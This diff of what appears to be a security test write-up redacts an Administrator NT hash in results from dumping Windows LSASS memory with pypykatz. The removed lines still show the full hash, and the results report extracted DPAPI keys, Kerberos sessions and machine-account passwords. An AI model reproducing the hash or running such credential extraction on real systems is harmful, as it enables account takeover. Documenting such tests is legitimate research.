@@ -170,7 +170,7 @@ pypykatz lsa minidump /tmp/out2.dmp
 **Test A results (WIN-ATTACK, 20348.587):**
 ```
 username : Administrator / WIN-ATTACK
-NT hash  : 3c02b6b6fb6b3b17242dc33a31bc011f
+NT hash  : 3cxxxxxxxxxxxxxxxxxxxxxxxx
 DPAPI masterkey, Kerberos session extracted
 Machine account NT hash + Kerberos plaintext password extracted
 ```
@@ -178,7 +178,7 @@ Machine account NT hash + Kerberos plaintext password extracted
 **Test B results (WIN-1KS84GNPAUM, 20348.5020) — three successful runs:**
 ```
 username : Administrator / WIN-1KS84GNPAUM
-NT hash  : 3c02b6b6fb6b3b17242dc33a31bc011f
+NT hash  : 3cxxxxxxxxxxxxxxxxxxxxxxxx
 DPAPI masterkeys (x3), Kerberos session extracted
 Machine account NT hash + Kerberos plaintext password extracted
 ```
